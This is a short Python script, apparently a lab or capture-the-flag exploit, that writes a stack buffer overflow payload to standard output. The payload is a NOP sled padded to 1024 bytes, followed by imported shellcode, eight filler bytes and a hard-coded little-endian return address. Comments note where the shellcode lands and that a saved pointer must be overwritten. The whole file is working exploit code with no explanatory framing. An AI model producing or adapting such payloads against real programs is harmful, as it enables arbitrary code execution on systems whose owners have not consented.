#!/usr/bin/env python3

import sys

from shellcode import shellcode
address =0x7FFFFFF6ACE0
#next 8 is at 0x7ffffff6acb0 this is where the shellcode is, now need to override rsp 
#note reset to 8 after done
sys.stdout.buffer.write(b'\x90'* (1024-len(shellcode))  + shellcode + b'\x00'*8 + address.to_bytes(8,'little' ))
